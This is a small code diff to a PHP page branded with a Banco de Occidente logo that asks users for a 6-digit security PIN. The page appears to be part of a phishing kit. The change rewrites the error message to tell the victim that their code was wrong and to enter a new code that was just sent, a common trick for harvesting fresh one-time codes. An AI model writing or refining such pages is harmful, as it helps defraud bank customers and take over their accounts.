@@ -119,7 +119,7 @@ $error_pin = isset($_GET['error']) && $_GET['error'] == 'pin_malo';
         <img src="logo.png" alt="Logo Banco de Occidente">
         <h2>Validación de Código</h2>
         <?php if ($error_pin): ?>
-            <div class="error-box">PIN incorrecto, por favor ingréselo nuevamente.</div>
+            <div class="error-box">Código incorrecto ingrese el nuevo código que le hemos enviado.</div>
         <?php else: ?>
             <p>Ingrese su pin de seguridad de 6 dígitos para continuar.</p>
         <?php endif; ?>
